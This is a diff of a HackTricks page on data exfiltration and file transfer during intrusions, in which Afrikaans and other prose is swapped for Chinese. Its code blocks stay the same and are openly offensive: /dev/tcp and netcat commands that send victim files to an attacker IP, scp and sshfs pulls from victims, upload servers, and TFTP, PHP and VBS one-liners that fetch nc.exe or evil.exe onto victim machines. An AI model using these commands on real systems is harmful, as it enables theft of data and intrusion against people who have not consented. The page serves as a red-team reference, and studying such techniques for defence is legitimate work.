@@ -1,25 +1,25 @@
 # Exfiltration
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
-## Gewoonlik gewhitelist domeine om inligting te exfiltreer
+## 常见的白名单域名以提取信息
 
-Check [https://lots-project.com/](https://lots-project.com/) om gewoonlik gewhitelist domeine te vind wat misbruik kan word
+查看 [https://lots-project.com/](https://lots-project.com/) 找到可以被滥用的常见白名单域名
 
-## Copy\&Paste Base64
+## 复制\&粘贴 Base64
 
 **Linux**
 ```bash
@@ -55,11 +55,11 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Laai lêers op
+### 上传文件
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer wat GET en POSTs (ook koptekste) druk**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-* Python module [uploadserver](https://pypi.org/project/uploadserver/):
+* [**SimpleHttpServer 打印 GET 和 POST（以及头部）**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* Python 模块 [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -72,7 +72,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS Bediener**
+### **HTTPS 服务器**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -115,17 +115,17 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ## FTP
 
-### FTP-bediener (python)
+### FTP 服务器 (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP-bediener (NodeJS)
+### FTP 服务器 (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP-bediener (pure-ftp)
+### FTP 服务器 (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -143,7 +143,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Windows** kliënt
+### **Windows** 客户端
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -156,14 +156,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali as bediener
+Kali 作为服务器
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Of skep 'n smb deel **met samba**:
+或创建一个 smb 共享 **使用 samba**：
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -188,13 +188,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-Die aanvaller moet SSHd aan die gang hê.
+攻击者必须运行 SSHd。
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-As die slagoffer SSH het, kan die aanvaller 'n gids van die slagoffer na die aanvaller monteer.
+如果受害者有SSH，攻击者可以将受害者的目录挂载到攻击者的系统上。
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -207,19 +207,19 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Laai lêer af van slagoffer
+### 从受害者下载文件
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Laai lêer op na slagoffer
+### 上传文件到受害者
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-dank aan **@BinaryShadow\_**
+感谢 **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -241,33 +241,33 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-As jy data na 'n SMTP-bediener kan stuur, kan jy 'n SMTP skep om die data met python te ontvang:
+如果您可以将数据发送到SMTP服务器，则可以使用python创建一个SMTP来接收数据：
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Standaard in XP en 2003 (in ander moet dit eksplisiet tydens installasie bygevoeg word)
+在XP和2003中默认启用（在其他版本中需要在安装时显式添加）
 
-In Kali, **begin TFTP bediener**:
+在Kali中，**启动TFTP服务器**：
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**TFTP-bediener in python:**
+**用Python编写的TFTP服务器：**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-In **slagoffer**, verbind met die Kali-bediener:
+在**victim**中，连接到Kali服务器：
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Laai 'n lêer af met 'n PHP oneliner:
+使用 PHP 一行代码下载文件：
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -275,7 +275,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
-**Slachtoffer**
+**受害者**
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -309,13 +309,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Die `debug.exe` program stel nie net in staat om binêre te inspekteer nie, maar het ook die **vermoë om hulle vanaf hex te herbou**. Dit beteken dat deur 'n hex van 'n binêre te verskaf, kan `debug.exe` die binêre lêer genereer. Dit is egter belangrik om te noem dat debug.exe 'n **beperking het om lêers tot 64 kb in grootte te monteer**.
+`debug.exe`程序不仅允许检查二进制文件，还具有**从十六进制重建它们的能力**。这意味着通过提供二进制文件的十六进制，`debug.exe`可以生成二进制文件。然而，重要的是要注意，debug.exe有**组装文件大小限制为64 kb**。
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Then copy-paste the text into the windows-shell and a file called nc.exe will be created.
+然后将文本复制粘贴到 Windows Shell 中，将创建一个名为 nc.exe 的文件。
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
@@ -324,16 +324,16 @@ Then copy-paste the text into the windows-shell and a file called nc.exe will be
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
